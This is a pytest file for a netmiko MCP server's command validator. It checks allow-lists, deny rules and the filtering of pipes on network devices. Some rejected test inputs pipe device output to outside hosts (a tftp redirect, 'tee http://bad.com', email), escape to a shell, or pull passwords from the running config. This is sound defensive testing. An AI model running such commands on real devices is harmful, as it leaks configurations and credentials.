from typing import Any
from unittest.mock import patch

from netmiko_mcp.security import validate_command


@patch("netmiko_mcp.security.load_security_config")
def test_validate_command_default_allowed(mock_load: Any) -> None:
    """Test that default behavior strictly denies everything if no YAML is loaded."""
    mock_load.return_value = {}  # Simulate missing or empty YAML
    assert validate_command("show ip int brief") is False
    assert validate_command("show version") is False


def test_validate_command_abbreviations_denied() -> None:
    """Test that abbreviated or non-exact commands are denied."""
    assert validate_command("show ip int bri") is False
    assert validate_command("show version | include ios") is False


def test_validate_command_default_denied() -> None:
    """Test that default dangerous substrings are rejected."""
    # Piping is dangerous
    assert validate_command("show run | include password") is False
    # Clear is forbidden
    assert validate_command("clear ip ospf process") is False
    # Debug is forbidden
    assert validate_command("debug ip packet") is False


@patch("netmiko_mcp.security.load_security_config")
def test_validate_command_custom_yaml(mock_load: Any) -> None:
    """Test that an external YAML config overrides the defaults."""
    mock_load.return_value = {
        "allowed_commands": ["display interface brief", "show version"],
        "denied_commands": ["reboot"],
    }

    # Defaults should now fail (if they aren't explicitly in the custom config)
    assert validate_command("show ip int brief") is False

    # Custom allowed should pass
    assert validate_command("display interface brief") is True

    # Custom denied should fail
    assert validate_command("display interface brief reboot") is False


@patch("netmiko_mcp.security.settings")
@patch("netmiko_mcp.security.load_security_config")
def test_validate_command_pipes_disabled(mock_load: Any, mock_settings: Any) -> None:
    """Test that pipes are rejected when allow_pipe is False."""
    mock_settings.allow_pipe = False
    mock_load.return_value = {"allowed_commands": ["show version"], "denied_commands": []}

    # Base command passes
    assert validate_command("show version") is True
    # Piped command fails
    assert validate_command("show version | include uptime") is False


@patch("netmiko_mcp.security.settings")
@patch("netmiko_mcp.security.load_security_config")
def test_validate_command_pipes_enabled_safe(mock_load: Any, mock_settings: Any) -> None:
    """Test that safe pipes are permitted when allow_pipe is True."""
    mock_settings.allow_pipe = True
    mock_load.return_value = {"allowed_commands": ["show version"], "denied_commands": []}

    # Standard safe pipes
    assert validate_command("show version | include uptime") is True
    assert validate_command("show version | exclude test") is True
    assert validate_command("show version | section ospf") is True
    assert validate_command("show version | begin router") is True
    assert validate_command("show version | count") is True

    # NX-OS formatting pipes
    assert validate_command("show version | json") is True
    assert validate_command("show version | json-pretty") is True
    assert validate_command("show version | xml") is True
    assert validate_command("show version | human") is True

    # NX-OS textual pipes
    assert validate_command("show version | grep test") is True
    assert validate_command("show version | egrep test") is True
    assert validate_command("show version | head 5") is True
    assert validate_command("show version | last 5") is True
    assert validate_command("show version | sort") is True
    assert validate_command("show version | uniq") is True
    assert validate_command("show version | wc") is True
    assert validate_command("show version | end test") is True
    assert validate_command("show version | nz") is True


@patch("netmiko_mcp.security.settings")
@patch("netmiko_mcp.security.load_security_config")
def test_validate_command_pipes_enabled_dangerous(mock_load: Any, mock_settings: Any) -> None:
    """Test that dangerous pipes are rejected even when allow_pipe is True."""
    mock_settings.allow_pipe = True
    mock_load.return_value = {"allowed_commands": ["show version"], "denied_commands": []}

    # Dangerous redirects
    assert validate_command("show version | redirect tftp://1.1.1.1/test") is False
    assert validate_command("show version | append flash:test.txt") is False
    assert validate_command("show version | tee http://bad.com") is False

    # Dangerous shell escapes and manipulations (NX-OS)
    assert validate_command("show version | awk '{print $1}'") is False
    assert validate_command("show version | sed 's/a/b/'") is False
    assert validate_command("show version | cut -d' ' -f1") is False
    assert validate_command("show version | tr a b") is False
    assert validate_command("show version | vsh") is False
    assert validate_command("show version | email test@test.com") is False
    assert validate_command("show version | diff") is False
